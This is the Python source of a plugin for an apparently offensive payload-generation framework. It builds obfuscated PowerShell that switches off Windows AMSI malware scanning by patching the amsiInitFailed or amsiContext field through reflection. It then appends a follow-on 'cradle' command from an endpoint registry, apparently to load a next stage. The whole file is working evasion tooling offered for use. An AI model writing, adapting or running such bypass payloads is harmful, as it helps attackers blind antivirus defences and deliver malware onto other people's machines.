from plugins._base import BaseCradlePlugin
from core.obfuscate_getrandom import get_random_obfuscated_string as sgr


class AmsiBypassPsSgr(BaseCradlePlugin):
    NAME        = "amsi-bypass-ps-sgr"
    DESCRIPTION = "AMSI Bypass - Performs reflective field patching using SGR (Seeded Get-Random) obfuscated PowerShell"
    AUTHOR      = "CyberSecN00b"

    OPTIONS = {
        "BYPASS_METHOD": {
            "description": "AMSI bypass technique: amsiInitFailed | amsiContext",
            "default": "amsiInitFailed",
            "restricted_to": ["amsiInitFailed", "amsiContext"]
        }
    }

    def generate(self, options: dict) -> str:
        method  = options.get("BYPASS_METHOD", "amsiInitFailed").lower()
        payload = []

        if method == "amsicontext":
            payload.append(
                f"[Ref].{sgr("Assembly")}.{sgr("GetType")}({sgr("System.Management.Automation.AmsiUtils")}).{sgr("GetField")}({sgr("amsiContext")},{sgr("NonPublic,Static")}).{sgr("SetValue")}($null,[IntPtr]::Zero);"
            )
        else:
            payload.append(
                f"[Ref].{sgr("Assembly")}.{sgr("GetType")}({sgr("System.Management.Automation.AmsiUtils")}).{sgr("GetField")}({sgr("amsiInitFailed")},{sgr("NonPublic,Static")}).{sgr("SetValue")}($null,$true);"
            )

        if self._endpoint_registry:
            cradle_command = self._endpoint_registry.get_cradle_command(options.get("NEXT_CRADLE"))
            if cradle_command:
                payload.append(
                    cradle_command
                )

        return "\n".join(payload) + "\n"